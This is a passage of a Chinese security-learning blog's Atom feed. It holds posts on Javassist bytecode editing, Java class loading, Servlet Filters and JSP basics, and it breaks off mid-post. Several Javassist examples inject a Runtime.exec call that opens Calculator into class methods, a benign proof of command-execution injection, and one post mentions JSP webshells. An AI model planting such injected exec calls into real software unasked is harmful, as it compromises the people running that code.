        <content type="html"><![CDATA[<h1 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Javassist</code>是一个开源的分析、编辑和创建 Java 字节码的类库；相对于<code>ASM</code>，<code>Javassist</code>提供了更加简单便捷的<code>API</code>。通过<code>Javassist</code>，我们可以像写<code>Java</code>代码一样直接插入<code>Java</code>代码片段，不用关注<code>Java</code>底层的字节码和栈操作，仅仅需要学会使用<code>Javassist</code>的<code>API</code>即可实现字节码编辑。</p><h2 id="API和标识符"><a href="#API和标识符" class="headerlink" title="API和标识符"></a>API和标识符</h2><p><code>Javassist</code>提供了类似于 Java 反射机制的 API，如 <a href="http://www.javassist.org/html/javassist/CtClass.html">CtClass</a>，<a href="http://www.javassist.org/html/javassist/CtConstructor.html">CtConstructor</a>、<a href="http://www.javassist.org/html/javassist/CtMethod.html">CtMethod</a>、<a href="http://www.javassist.org/html/javassist/CtField.html">CtField</a> 与 Java 反射的<code>class</code>、<code>Constructor</code>、<code>Method</code>、<code>Field</code>非常的相似。</p><div class="table-container"><table><thead><tr><th>类</th><th>描述</th></tr></thead><tbody><tr><td>ClassPool</td><td>ClassPool是一个存储CtClass的容器，如果调用<code>get</code>方法会搜索并创建一个表示该类的CtClass对象</td></tr><tr><td>CtClass</td><td>CtClass表示的是从ClassPool获取的类对象，可对该类就行读写编辑等操作</td></tr><tr><td>CtMethod</td><td>可读写的类方法对象</td></tr><tr><td>CtConstructor</td><td>可读写的类构造方法对象</td></tr><tr><td>CtField</td><td>可读写的类成员变量对象</td></tr></tbody></table></div><p><code>Javassist</code>使用了内置的标识符来表示一些特定的含义，如：<code>$_</code>表示返回值。我们可以在动态插入类代码的时候使用这些特殊的标识符来表示对应的对象。</p><div class="table-container"><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td><code>$0, $1, $2, ...</code></td><td><code>this</code>和方法参数</td></tr><tr><td><code>$args</code></td><td><code>Object[]</code>类型的参数数组</td></tr><tr><td>$$$$</td><td>所有的参数，如<code>m($$)</code>等价于<code>m($1,$2,...)</code></td></tr><tr><td><code>$cflow(...)</code></td><td>cflow变量</td></tr><tr><td><code>$r</code></td><td>返回类型，用于类型转换</td></tr><tr><td><code>$w</code></td><td>包装类型，用于类型转换</td></tr><tr><td><code>$_</code></td><td>方法返回值</td></tr><tr><td><code>$sig</code></td><td>方法签名，返回<code>java.lang.Class[]</code>数组类型</td></tr><tr><td><code>$type</code></td><td>返回值类型，<code>java.lang.Class</code>类型</td></tr><tr><td><code>$class</code></td><td>当前类，<code>java.lang.Class</code>类型</td></tr></tbody></table></div><h2 id="读取类-成员变量-方法信息"><a href="#读取类-成员变量-方法信息" class="headerlink" title="读取类/成员变量/方法信息"></a>读取类/成员变量/方法信息</h2><p><code>Javassist</code>通过<code>ClassPool</code>对象获取到<code>CtClass</code>对象后就可以像使用 Java 反射 API 一样去读取类信息</p><p><code>Javassist</code>读取类信息示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/28 17:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 获取类对象</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.bytecode.HelloWorld&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;解析类名：&quot;</span>+ ctClass.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;父类：&quot;</span>+ ctClass.getSuperclass());</span><br><span class="line">        System.out.println(<span class="string">&quot;实现接口：&quot;</span>+ Arrays.toString(ctClass.getInterfaces()));</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取所有构造方法</span></span><br><span class="line">        CtConstructor[] constructors = ctClass.getDeclaredConstructors();</span><br><span class="line">        <span class="comment">// 获取所有成员变量</span></span><br><span class="line">        CtField[] ctFields = ctClass.getDeclaredFields();</span><br><span class="line">        <span class="comment">// 获取所有成员方法</span></span><br><span class="line">        CtMethod[] ctMethods = ctClass.getDeclaredMethods();</span><br><span class="line">        <span class="comment">// 输出所有的构造方法</span></span><br><span class="line">        <span class="keyword">for</span>(CtConstructor constructor:constructors)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;构造方法：&quot;</span>+ constructor);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 输出所有的成员变量</span></span><br><span class="line">        <span class="keyword">for</span>(CtField ctField:ctFields)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;成员变量：&quot;</span>+ctField);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 输出所有的成员方法</span></span><br><span class="line">        <span class="keyword">for</span>(CtMethod ctMethod: ctMethods)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;成员方法：&quot;</span>+ctMethod);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="images/image-20221001170103439.png" alt="image-20221001170103439"></p><h2 id="修改类方法"><a href="#修改类方法" class="headerlink" title="修改类方法"></a>修改类方法</h2><p><code>CtMethod</code>提供了类方法修改的<code>API</code>：</p><ul><li><code>setModifies()</code>：修改类的访问修饰符</li><li><code>insertBefore()</code>：在类方法执行前插入任意 Java 代码片段</li><li><code>insertAfter()</code>：在类方法执行后插入任意 Java 代码片段</li><li><code>setBody()</code>：修改整个方法的代码</li><li><code>removeField()</code>：删除类的成员变量</li><li><code>removeMethod()</code>：删除类的方法</li></ul><p>修改前：<br><img src="images/image-20221001175527019.png" alt="image-20221001175527019"></p><p>修改类方法代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/28 17:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 获取类对象</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.bytecode.HelloWorld&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取hello方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;);</span><br><span class="line">        <span class="comment">// 修改hello方法访问权限为private</span></span><br><span class="line">        ctMethod.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">// 修改整个hello方法</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span> +</span><br><span class="line">                         <span class="string">&quot;return \&quot;ok!\&quot;;&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">// 替换原有的文件，绝对路径</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;target/classes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后类文件被修改如下<br><img src="images/image-20221001232420549.png" alt="image-20221001232420549"></p><p>再次运行时执行我们插入的命令执行代码片段<br><img src="images/image-20221001232449700.png" alt="image-20221001232449700"></p><h2 id="动态创建Java类二进制"><a href="#动态创建Java类二进制" class="headerlink" title="动态创建Java类二进制"></a>动态创建Java类二进制</h2><p><code>Javassist</code>可以动态的创建一个类的二进制，例如需要生成一个<code>HelloWorld</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span> + name);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>Javassist</code>生成类字节码示例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/28 17:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 创建HelloWorld类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">helloWorldClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;com.bytecode.HelloWorld&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建类成员</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;private static String name = \&quot;dotast\&quot;;&quot;</span>,helloWorldClass);</span><br><span class="line">        <span class="comment">// 添加类成员到类中</span></span><br><span class="line">        helloWorldClass.addField(ctField);</span><br><span class="line">        <span class="comment">// 创建 main 主方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">mainMethod</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;public static void main(String[] args)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        System.out.println(\&quot;Hello\&quot; + name);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;&quot;</span>, helloWorldClass);</span><br><span class="line">        helloWorldClass.addMethod(mainMethod);</span><br><span class="line">        <span class="comment">// 替换原有的文件，绝对路径</span></span><br><span class="line">        helloWorldClass.writeFile(<span class="string">&quot;target/classes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>生成后如下<br><img src="images/image-20221002000336101.png" alt="image-20221002000336101"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java类加载机制</title>
      <link href="/2021/11/21/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
      <url>/2021/11/21/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将文件转换成字节码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">tool</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">fun</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line">        <span class="type">byte</span>[] kk = fun.fileConvertToByteArray(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/TestExp.class&quot;</span>));</span><br><span class="line">        System.out.println(Arrays.toString(kk));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fun</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] fileConvertToByteArray(File file) &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        ByteArrayOutputStream baos;</span><br><span class="line">        FileInputStream fis;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            baos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> ((len = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            data = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">            fis.close();</span><br><span class="line">            baos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫</title>
      <link href="/2021/11/21/python%E7%88%AC%E8%99%AB/"/>
      <url>/2021/11/21/python%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="907fbfed5f9c811435589b30d9ca3cbbb1d944b91fdf443d24f4b9246bc9e4c2">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7c487d9f0e56cb36849e0410ddb9e8eaf1ad980b89b5686a365214129c178c0f1775a1dd0c0b96704b585e78293817f63f83e76444490393828c8b0d7efc29e8b8b03bbe0796dc4fa019d2d0979ca16df</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端三件套</title>
      <link href="/2021/11/21/%E5%89%8D%E7%AB%AF%E4%B8%89%E4%BB%B6%E5%A5%97/"/>
      <url>/2021/11/21/%E5%89%8D%E7%AB%AF%E4%B8%89%E4%BB%B6%E5%A5%97/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1aef0d531ff66003722d0bc5b87e067fa055fd6b9cbd1b22e762b02d879f36c9">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f77a1899b1f5b4eccb1c43d5e476aa41daf80194f6c07140cbd3f4e13d215f140048afac269ab92699fcc7eddc6d938609321c4c29e7f01fce10489f4cc1ab172992d44be3215b7b603b74d2ec0858efd0bb0f85c7244aa2054891f3e7d6154202e5d0dcaeaa8c3152bf140fa6c45efa4e65e1f8dd35b733910e8fa5f62e8a13f4d47432febfe063c1891986b78e09b1649498bfbbed5320bef52349f74f1875897e9cd271bdc43c311dd200df33a5502c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Filter基础</title>
      <link href="/2021/11/21/Filter/"/>
      <url>/2021/11/21/Filter/</url>
      
        <content type="html"><![CDATA[<h1 id="Filter基础"><a href="#Filter基础" class="headerlink" title="Filter基础"></a>Filter基础</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><code>javax.servlet.Filter</code>是<code>Servlet2.3</code>新增的一个特性,主要用于过滤URL请求，通过Filter我们可以实现URL请求资源权限验证、用户登陆检测等功能。</p><p>Filter是一个接口，实现一个Filter只需要重写<code>init</code>、<code>doFilter</code>、<code>destroy</code>方法即可，其中过滤逻辑都在<code>doFilter</code>方法中实现。</p><p><code>Filter</code>的配置类似于<code>Servlet</code>，由<code>&lt;filter&gt;</code>和<code>&lt;filter-mapping&gt;</code>两组标签组成，如果Servlet版本大于3.0同样可以使用注解的方式配置Filter。</p><p>Filter 的生命周期和 Servlet 一样，如下所示：</p><ul><li><code>init(FilterConfig)</code>：初始化方法，只会在 web 应用程序启动时调用一次。</li><li><code>doFilter(ServletRequest, ServletResponse, FilterChain)</code>：实现过滤功能。当客户请求访问与过滤器关联的 URL 的时候，过滤器将先执行 doFilter 方法。FilterChain 参数用于访问后续过滤器</li><li><code>destory()</code>：销毁 Filter，只会在当 web 应用移除或服务器停止时才调用一次来销毁 Filter 对象</li></ul><p>一个 Servlet 可以注册多个 Filter，Web 容器会将注册的多个 Filter 组合成一个“Filter链”，并按照一定的顺序依次执行各 Filter 的 doFilter() 方法。</p><p><img src="/2021/11/21/Filter/Tomcat-4.png" alt></p><h2 id="基于注解实现的Filter"><a href="#基于注解实现的Filter" class="headerlink" title="基于注解实现的Filter"></a>基于注解实现的Filter</h2><p>简单写个 demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package com.servlet.study;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Created by dotast on 2022/10/21 10:41</span><br><span class="line"> */</span><br><span class="line">@WebFilter(filterName = &quot;ServletTest&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;)</span><br><span class="line">public class ServletTest implements Filter &#123;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">        String name = servletRequest.getParameter(&quot;name&quot;);</span><br><span class="line">        if(name.equals(&quot;admin&quot;))&#123;</span><br><span class="line">            // 跳转到 amdin.jsp</span><br><span class="line">            RequestDispatcher redirect = servletRequest.getRequestDispatcher(&quot;/admin.jsp&quot;);</span><br><span class="line">            redirect.forward(servletRequest,servletResponse);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            RequestDispatcher redirect = servletRequest.getRequestDispatcher(&quot;/loginerror.jsp&quot;);</span><br><span class="line">            redirect.forward(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">        // 使下一个 Filter 能够继续执行</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/21/Filter/image-20221021163302120.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> Filter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jsp基础</title>
      <link href="/2021/11/21/Jsp/"/>
      <url>/2021/11/21/Jsp/</url>
      
        <content type="html"><![CDATA[<h1 id="Jsp基础"><a href="#Jsp基础" class="headerlink" title="Jsp基础"></a>Jsp基础</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>JSP 与 PHP、ASP 等脚本语言类似，早期为了简化<code>Servlet</code>的处理流程而诞生，目的是起到快速处理后端的逻辑请求任务。因为 Jsp 可以直接调用 Java 代码的特性，成为了 Webshell 的载体。</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><ul><li><code>&lt;%@ page ... %&gt;</code>：定义网页依赖属性，比如脚本语言，error 页面等。</li><li><code>&lt;%@ include ...%&gt;</code>：包含其他文件（静态）</li><li><code>&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;</code>：引入标签库的定义</li></ul><h2 id="JSP表达式（EL）"><a href="#JSP表达式（EL）" class="headerlink" title="JSP表达式（EL）"></a>JSP表达式（EL）</h2><p>EL表达式( Expression Language )语言,常用于在jsp页面中获取请求中的值，使用EL表达式可以实现命令执行，这里只是简单说一下概念，具体实现等到用时再聊，这里不展开。</p><ul><li>立即求值：<code>$&#123;&#125;</code></li><li>延迟求值：<code>#&#123;&#125;</code></li></ul><h2 id="JSP标准标签库（JSTL）"><a href="#JSP标准标签库（JSTL）" class="headerlink" title="JSP标准标签库（JSTL）"></a>JSP标准标签库（JSTL）</h2><p>JSP标准标签库（JSTL）是一个JSP标签集合，它封装了JSP应用的通用核心功能。</p><p>JSTL支持通用的、结构化的任务，比如迭代，条件判断，XML文档操作，国际化标签，SQL标签。 除了这些，它还提供了一个框架来使用集成JSTL的自定义标签。</p><h2 id="JSP对象"><a href="#JSP对象" class="headerlink" title="JSP对象"></a>JSP对象</h2><p>从本质上说 JSP 就是一个Servlet，JSP 引擎在调用 JSP 对应的 jspServlet 时，会传递或创建 9 个与 web 开发相关的对象供 jspServlet 使用。 JSP 技术的设计者为便于开发人员在编写 JSP 页面时获得这些 web 对象的引用，特意定义了 9 个相应的变量，开发人员在JSP页面中通过这些变量就可以快速获得这 9 大对象的引用。</p><p>如下：</p><div 